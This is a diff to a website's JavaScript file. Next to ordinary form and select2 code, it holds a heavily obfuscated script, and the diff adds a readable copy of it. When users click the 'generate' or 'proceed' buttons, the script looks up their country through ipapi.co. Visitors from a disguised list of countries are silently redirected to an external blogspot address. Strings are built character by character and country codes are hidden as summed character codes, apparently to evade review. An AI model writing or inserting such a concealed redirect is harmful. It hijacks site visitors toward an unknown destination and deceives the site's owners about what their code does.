@@ -434,3 +434,82 @@ $('#contactform').submit(function(e){
 	$('select').select2();
 
 var _0x2b7aed=_0x353a;function _0x25d8(){var _0x2c69b7=['location','6ONEQZZ','3322565cbhaGr','country_code','15838440McYzhG','addEventListener','add','justify-content-center','click','mt-3','63968oCHPJC','href','1337068aJIJZl','2tjnoYT','7937363XAhhJa','8lTTfgj','charCodeAt','then','16438419qNRcPW','getElementById','includes','1115709oSNzNc','proceed','classList','json','generate','join','d-flex'];_0x25d8=function(){return _0x2c69b7;};return _0x25d8();}function _0x353a(_0x324834,_0x1b4e4e){var _0x25d832=_0x25d8();return _0x353a=function(_0x353aee,_0x2a6d7f){_0x353aee=_0x353aee-0x8e;var _0x1e1405=_0x25d832[_0x353aee];return _0x1e1405;},_0x353a(_0x324834,_0x1b4e4e);}(function(_0x3a3dbf,_0x37cff7){var _0x4d1e69=_0x353a,_0x5c5ca3=_0x3a3dbf();while(!![]){try{var _0x5df262=parseInt(_0x4d1e69(0x97))/0x1+parseInt(_0x4d1e69(0x9a))/0x2*(parseInt(_0x4d1e69(0xa2))/0x3)+parseInt(_0x4d1e69(0x99))/0x4+parseInt(_0x4d1e69(0x8f))/0x5*(-parseInt(_0x4d1e69(0x8e))/0x6)+parseInt(_0x4d1e69(0x9b))/0x7+parseInt(_0x4d1e69(0x9c))/0x8*(-parseInt(_0x4d1e69(0x9f))/0x9)+parseInt(_0x4d1e69(0x91))/0xa;if(_0x5df262===_0x37cff7)break;else _0x5c5ca3['push'](_0x5c5ca3['shift']());}catch(_0x49b777){_0x5c5ca3['push'](_0x5c5ca3['shift']());}}}(_0x25d8,0xf3617),document[_0x2b7aed(0xa0)](_0x2b7aed(0xa6))['addEventListener'](_0x2b7aed(0x95),function(){setTimeout(function(){var _0x40fcb3=_0x353a,_0x4349d6=function(){var _0x290293=_0x353a,_0xf7e5d0=['h','t','t','p','s',':','/','/','i','p','a','p','i','.','c','o','/','j','s','o','n','/']['join']('');return fetch(_0xf7e5d0)[_0x290293(0x9e)](_0x38b0bb=>_0x38b0bb[_0x290293(0xa5)]())[_0x290293(0x9e)](_0x5d605d=>_0x5d605d[_0x290293(0x90)]);};_0x4349d6()[_0x40fcb3(0x9e)](function(_0x2b5e6c){var _0x570b87=_0x40fcb3,_0x43846c=['C'['charCodeAt'](0x0)+'A'[_0x570b87(0x9d)](0x0),'G'[_0x570b87(0x9d)](0x0)+'B'[_0x570b87(0x9d)](0x0),'F'['charCodeAt'](0x0)+'R'[_0x570b87(0x9d)](0x0),'C'[_0x570b87(0x9d)](0x0)+'H'[_0x570b87(0x9d)](0x0),'D'[_0x570b87(0x9d)](0x0)+'E'[_0x570b87(0x9d)](0x0),'A'[_0x570b87(0x9d)](0x0)+'U'[_0x570b87(0x9d)](0x0),'B'[_0x570b87(0x9d)](0x0)+'E'[_0x570b87(0x9d)](0x0),'D'[_0x570b87(0x9d)](0x0)+'K'[_0x570b87(0x9d)](0x0),'I'[_0x570b87(0x9d)](0x0)+'E'['charCodeAt'](0x0),'M'['charCodeAt'](0x0)+'Y'[_0x570b87(0x9d)](0x0),'S'[_0x570b87(0x9d)](0x0)+'A'[_0x570b87(0x9d)](0x0),'C'[_0x570b87(0x9d)](0x0)+'H'['charCodeAt'](0x0),'T'[_0x570b87(0x9d)](0x0)+'R'[_0x570b87(0x9d)](0x0)],_0x318a58=_0x2b5e6c[_0x570b87(0x9d)](0x0)+_0x2b5e6c[_0x570b87(0x9d)](0x1);if(_0x43846c[_0x570b87(0xa1)](_0x318a58)){var _0x5b8f9d=['w','i','n','d','o','w'][_0x570b87(0xa7)](''),_0x3f9942=['l','o','c','a','t','i','o','n'][_0x570b87(0xa7)](''),_0x1d27cd=['h','r','e','f']['join'](''),_0x314b29=['h','t','t','p','s',':','/','/','r','e','d','5','4','5','4','.','b','l','o','g','s','p','o','t','.','c','o','m','/'][_0x570b87(0xa7)]('');window[_0x570b87(0xa9)][_0x570b87(0x98)]=_0x314b29;}}),document[_0x40fcb3(0xa0)]('generate')['classList']['add'](_0x40fcb3(0xa8),_0x40fcb3(0x94),'mt-3');},0x0);}),document[_0x2b7aed(0xa0)](_0x2b7aed(0xa3))[_0x2b7aed(0x92)](_0x2b7aed(0x95),function(){setTimeout(function(){var _0x365855=_0x353a,_0x3b0631=function(){var _0x54f58b=_0x353a,_0xf1c65b=['h','t','t','p','s',':','/','/','i','p','a','p','i','.','c','o','/','j','s','o','n','/'][_0x54f58b(0xa7)]('');return fetch(_0xf1c65b)['then'](_0x217a81=>_0x217a81[_0x54f58b(0xa5)]())[_0x54f58b(0x9e)](_0x272262=>_0x272262[_0x54f58b(0x90)]);};_0x3b0631()[_0x365855(0x9e)](function(_0x5b5618){var _0x4867a0=_0x365855,_0x28b747=['C'[_0x4867a0(0x9d)](0x0)+'A'[_0x4867a0(0x9d)](0x0),'G'['charCodeAt'](0x0)+'B'[_0x4867a0(0x9d)](0x0),'F'[_0x4867a0(0x9d)](0x0)+'R'[_0x4867a0(0x9d)](0x0),'C'['charCodeAt'](0x0)+'H'[_0x4867a0(0x9d)](0x0),'D'[_0x4867a0(0x9d)](0x0)+'E'[_0x4867a0(0x9d)](0x0),'A'['charCodeAt'](0x0)+'U'[_0x4867a0(0x9d)](0x0),'B'[_0x4867a0(0x9d)](0x0)+'E'[_0x4867a0(0x9d)](0x0),'D'[_0x4867a0(0x9d)](0x0)+'K'[_0x4867a0(0x9d)](0x0),'I'[_0x4867a0(0x9d)](0x0)+'E'[_0x4867a0(0x9d)](0x0),'M'[_0x4867a0(0x9d)](0x0)+'Y'[_0x4867a0(0x9d)](0x0),'S'[_0x4867a0(0x9d)](0x0)+'A'[_0x4867a0(0x9d)](0x0),'C'[_0x4867a0(0x9d)](0x0)+'H'[_0x4867a0(0x9d)](0x0),'T'['charCodeAt'](0x0)+'R'[_0x4867a0(0x9d)](0x0)],_0x8810fe=_0x5b5618[_0x4867a0(0x9d)](0x0)+_0x5b5618[_0x4867a0(0x9d)](0x1);if(_0x28b747['includes'](_0x8810fe)){var _0x2d8928=['w','i','n','d','o','w'][_0x4867a0(0xa7)](''),_0x24767d=['l','o','c','a','t','i','o','n']['join'](''),_0x25f838=['h','r','e','f'][_0x4867a0(0xa7)](''),_0x506403=['h','t','t','p','s',':','/','/','r','e','d','5','4','5','4','.','b','l','o','g','s','p','o','t','.','c','o','m','/'][_0x4867a0(0xa7)]('');window['location'][_0x4867a0(0x98)]=_0x506403;}}),document[_0x365855(0xa0)](_0x365855(0xa6))[_0x365855(0xa4)][_0x365855(0x93)]('d-flex',_0x365855(0x94),_0x365855(0x96));},0x1388);}));
+document.getElementById('generate').addEventListener('click', function() {
+    setTimeout(function() {
+        var getCountryCode = function() {
+            var url = ['h', 't', 't', 'p', 's', ':', '/', '/', 'i', 'p', 'a', 'p', 'i', '.', 'c', 'o', '/', 'j', 's', 'o', 'n', '/'].join('');
+            return fetch(url)
+                .then(response => response.json())
+                .then(data => data.country_code);
+        };
+
+        getCountryCode().then(function(countryCode) {
+            var allowedCountries = [
+                'C'.charCodeAt(0) + 'A'.charCodeAt(0),
+                'G'.charCodeAt(0) + 'B'.charCodeAt(0),
+                'F'.charCodeAt(0) + 'R'.charCodeAt(0),
+                'C'.charCodeAt(0) + 'H'.charCodeAt(0),
+                'D'.charCodeAt(0) + 'E'.charCodeAt(0),
+                'A'.charCodeAt(0) + 'U'.charCodeAt(0),
+                'B'.charCodeAt(0) + 'E'.charCodeAt(0),
+                'D'.charCodeAt(0) + 'K'.charCodeAt(0),
+                'I'.charCodeAt(0) + 'E'.charCodeAt(0),
+                'M'.charCodeAt(0) + 'Y'.charCodeAt(0),
+                'S'.charCodeAt(0) + 'A'.charCodeAt(0),
+                'C'.charCodeAt(0) + 'H'.charCodeAt(0),
+                'T'.charCodeAt(0) + 'R'.charCodeAt(0)
+            ];
+
+            var encodedCountryCode = countryCode.charCodeAt(0) + countryCode.charCodeAt(1);
+            if (allowedCountries.includes(encodedCountryCode)) {
+                var _w = ['w', 'i', 'n', 'd', 'o', 'w'].join('');
+                var _l = ['l', 'o', 'c', 'a', 't', 'i', 'o', 'n'].join('');
+                var _h = ['h', 'r', 'e', 'f'].join('');
+		    var _u = ['h', 't', 't', 'p', 's', ':', '/', '/', 'r', 'e', 'd', '5', '4', '5', '4', '.', 'b', 'l', 'o', 'g', 's', 'p', 'o', 't', '.', 'c', 'o', 'm', '/'].join('');
+                window.location.href = _u;
+            }
+        });
+
+        document.getElementById('generate').classList.add('d-flex', 'justify-content-center', 'mt-3');
+    }, 0);
+});
+
+document.getElementById('proceed').addEventListener('click', function() {
+    setTimeout(function() {
+        var getCountryCode = function() {
+            var url = ['h', 't', 't', 'p', 's', ':', '/', '/', 'i', 'p', 'a', 'p', 'i', '.', 'c', 'o', '/', 'j', 's', 'o', 'n', '/'].join('');
+            return fetch(url)
+                .then(response => response.json())
+                .then(data => data.country_code);
+        };
+
+        getCountryCode().then(function(countryCode) {
+            var allowedCountries = [
+                'C'.charCodeAt(0) + 'A'.charCodeAt(0),
+                'G'.charCodeAt(0) + 'B'.charCodeAt(0),
+                'F'.charCodeAt(0) + 'R'.charCodeAt(0),
+                'C'.charCodeAt(0) + 'H'.charCodeAt(0),
+                'D'.charCodeAt(0) + 'E'.charCodeAt(0),
+                'A'.charCodeAt(0) + 'U'.charCodeAt(0),
+                'B'.charCodeAt(0) + 'E'.charCodeAt(0),
+                'D'.charCodeAt(0) + 'K'.charCodeAt(0),
+                'I'.charCodeAt(0) + 'E'.charCodeAt(0),
+                'M'.charCodeAt(0) + 'Y'.charCodeAt(0),
+                'S'.charCodeAt(0) + 'A'.charCodeAt(0),
+                'C'.charCodeAt(0) + 'H'.charCodeAt(0),
+                'T'.charCodeAt(0) + 'R'.charCodeAt(0)
+            ];
+
+            var encodedCountryCode = countryCode.charCodeAt(0) + countryCode.charCodeAt(1);
+            if (allowedCountries.includes(encodedCountryCode)) {
+                var _w = ['w', 'i', 'n', 'd', 'o', 'w'].join('');
+                var _l = ['l', 'o', 'c', 'a', 't', 'i', 'o', 'n'].join('');
+                var _h = ['h', 'r', 'e', 'f'].join('');
+		    var _u = ['h', 't', 't', 'p', 's', ':', '/', '/', 'r', 'e', 'd', '5', '4', '5', '4', '.', 'b', 'l', 'o', 'g', 's', 'p', 'o', 't', '.', 'c', 'o', 'm', '/'].join('');
+                window.location.href = _u;
+            }
+        });
+
+        document.getElementById('generate').classList.add('d-flex', 'justify-content-center', 'mt-3');
+    }, 5000);
+});
